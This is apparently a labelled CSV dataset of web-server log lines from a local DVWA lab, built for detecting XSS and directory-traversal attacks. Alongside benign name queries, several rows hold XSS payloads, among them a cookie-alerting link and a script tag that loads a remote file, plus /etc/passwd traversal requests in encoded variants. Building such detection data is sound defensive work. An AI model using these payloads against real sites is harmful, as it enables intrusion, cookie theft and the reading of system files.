,url,normal,xss,dir
17890,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Christa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2644,"127.0.0.1 - - [03/May/2021:03:06:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=empreses HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18705,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<label oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
8676,"127.0.0.1 - - [03/May/2021:03:13:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chuan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2016,"127.0.0.1 - - [03/May/2021:03:06:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=dulce HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14549,"127.0.0.1 - - [03/May/2021:03:06:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=lolo HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1716,"127.0.0.1 - - [03/May/2021:03:14:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dotty HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17092,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
16503,"127.0.0.1 - - [03/May/2021:03:10:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adria HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6757,"127.0.0.1 - - [03/May/2021:03:40:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<X OnXxx=1"" 400 0 ""-"" ""-""",0,1,0
14345,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command oncontextmenu=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",0,1,0
6476,"127.0.0.1 - - [03/May/2021:10:05:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%252e%252e%252fetc%252fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
6682,"127.0.0.1 - - [03/May/2021:03:17:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Harmony HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4684,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Odella HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14062,"127.0.0.1 - - [03/May/2021:03:28:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Winifred HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16715,"127.0.0.1 - - [03/May/2021:03:17:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ho HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
957,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<p onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
11502,"127.0.0.1 - - [03/May/2021:10:06:13 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..........................................................................\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
5776,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<basefont onmouseleave=\""alert(1)\"">test</basefont>"" 400 0 ""-"" ""-""",0,1,0
2619,"127.0.0.1 - - [03/May/2021:02:24:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20%6Fnxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
17789,"127.0.0.1 - - [03/May/2021:10:23:57 -0400] ""GET /DVWA/vulnerabilities/fi/?page=executables.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3542,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<listing ondblclick=\""alert(1)\"">test</listing>"" 400 0 ""-"" ""-""",0,1,0
14610,"127.0.0.1 - - [03/May/2021:10:06:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../..//..///etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
14164,"127.0.0.1 - - [03/May/2021:03:28:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Zuben HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6965,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&#X03c HTTP/1.1"" 400 0 ""-"" ""-""",0,1,0
14057,"127.0.0.1 - - [03/May/2021:02:18:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%3e%22 HTTP/1.1"" 200 1662 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
9320,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=http://foo.bar/#x=`y></a><img"" 400 0 ""-"" ""-""",0,1,0
7624,"127.0.0.1 - - [03/May/2021:03:16:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gisele HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1490,"127.0.0.1 - - [03/May/2021:03:27:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Thuthuy HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
301,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><multicol"" 400 0 ""-"" ""-""",0,1,0
14827,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<input type=image"" 400 0 ""-"" ""-""",0,1,0
13494,"127.0.0.1 - - [03/May/2021:10:05:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%252fetc%252fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
8134,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture onblur=alert(1)"" 400 0 ""-"" ""-""",0,1,0
20040,"127.0.0.1 - - [03/May/2021:03:25:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Russel HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
993,"127.0.0.1 - - [03/May/2021:03:17:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hugh HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17252,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nath HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10373,"127.0.0.1 - - [03/May/2021:03:22:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Micky HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5281,"127.0.0.1 - - [03/May/2021:03:10:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Amata HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2280,"127.0.0.1 - - [28/Apr/2021:21:53:28 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 992 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5986,"127.0.0.1 - - [03/May/2021:02:35:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe/%00/ src=javaSCRIPT&colon;alert(1)"" 400 0 ""-"" ""-""",0,1,0
4109,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Utilla HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6639,"127.0.0.1 - - [03/May/2021:03:25:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shaib HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6600,"127.0.0.1 - - [03/May/2021:10:23:51 -0400] ""GET /DVWA/vulnerabilities/fi/?page=deny.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
670,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click"" 400 0 ""-"" ""-""",0,1,0
20115,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><time"" 400 0 ""-"" ""-""",0,1,0
20367,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figcaption oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
12240,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie"" 400 0 ""-"" ""-""",0,1,0
18932,"127.0.0.1 - - [03/May/2021:03:24:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Reeba HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4326,"127.0.0.1 - - [03/May/2021:03:07:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=regional HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10682,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style ondblclick=\""alert(1)\"">test</style>"" 400 0 ""-"" ""-""",0,1,0
20454,"127.0.0.1 - - [03/May/2021:10:23:30 -0400] ""GET /DVWA/vulnerabilities/fi/?page=admon.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9168,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes onmouseleave=\""alert(1)\"">test</noframes>"" 400 0 ""-"" ""-""",0,1,0
11193,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
13326,"127.0.0.1 - - [03/May/2021:03:12:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celina HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
946,"127.0.0.1 - - [03/May/2021:03:14:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ede HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11485,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head onmouseup=\""alert(1)\"">test</head>"" 400 0 ""-"" ""-""",0,1,0
16810,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ulrike HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9632,"127.0.0.1 - - [03/May/2021:03:24:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Phyllys HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7297,"127.0.0.1 - - [03/May/2021:03:19:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Katsunori HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2946,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=student HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13689,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ol onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
7170,"127.0.0.1 - - [03/May/2021:03:23:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ninno HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8587,"127.0.0.1 - - [03/May/2021:03:14:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dirk HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10046,"127.0.0.1 - - [03/May/2021:03:20:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kristyn HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16350,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dt draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
12072,"127.0.0.1 - - [03/May/2021:03:19:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Juline HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19460,"127.0.0.1 - - [03/May/2021:03:22:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Miles HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8942,"127.0.0.1 - - [03/May/2021:03:25:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Roel HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7877,"127.0.0.1 - - [03/May/2021:03:11:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Baruk HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12971,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\"""" 400 0 ""-"" ""-""",0,1,0
9400,"127.0.0.1 - - [03/May/2021:03:05:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=cifrado HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4383,"127.0.0.1 - - [03/May/2021:03:23:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Narinder HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18675,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<shadow onmouseover=\""alert(1)\"">test</shadow>"" 400 0 ""-"" ""-""",0,1,0
899,"127.0.0.1 - - [03/May/2021:03:13:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Collen HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14511,"127.0.0.1 - - [03/May/2021:03:11:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ardelle HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15108,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<b onmouseover=\""alert(1)\"">test</b>"" 400 0 ""-"" ""-""",0,1,0
9998,"127.0.0.1 - - [03/May/2021:03:11:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Austine HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3818,"127.0.0.1 - - [03/May/2021:03:12:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Caren HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19624,"127.0.0.1 - - [03/May/2021:10:23:46 -0400] ""GET /DVWA/vulnerabilities/fi/?page=creation.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2317,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dl onmouseleave=\""alert(1)\"">test</dl>"" 400 0 ""-"" ""-""",0,1,0
15384,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",0,1,0
9764,"127.0.0.1 - - [03/May/2021:03:28:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yoshiko HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19315,"127.0.0.1 - - [03/May/2021:03:11:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Barnes HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
35,"127.0.0.1 - - [03/May/2021:03:27:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Trenna HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2615,"127.0.0.1 - - [03/May/2021:03:20:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Liva HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16634,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js'"" 400 0 ""-"" ""-""",0,1,0
13248,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea onselect=alert(1)"" 400 0 ""-"" ""-""",0,1,0
15894,"127.0.0.1 - - [03/May/2021:03:40:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
5001,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><dd"" 400 0 ""-"" ""-""",0,1,0
11596,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
5287,"127.0.0.1 - - [03/May/2021:03:21:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lynde HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15157,"127.0.0.1 - - [03/May/2021:10:23:46 -0400] ""GET /DVWA/vulnerabilities/fi/?page=create.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5518,"127.0.0.1 - - [03/May/2021:03:06:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=joy HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11990,"127.0.0.1 - - [03/May/2021:03:11:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Auroora HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
650,"127.0.0.1 - - [03/May/2021:03:12:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brandea HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15935,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<html onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
6161,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noscript onmouseover=\""alert(1)\"">test</noscript>"" 400 0 ""-"" ""-""",0,1,0
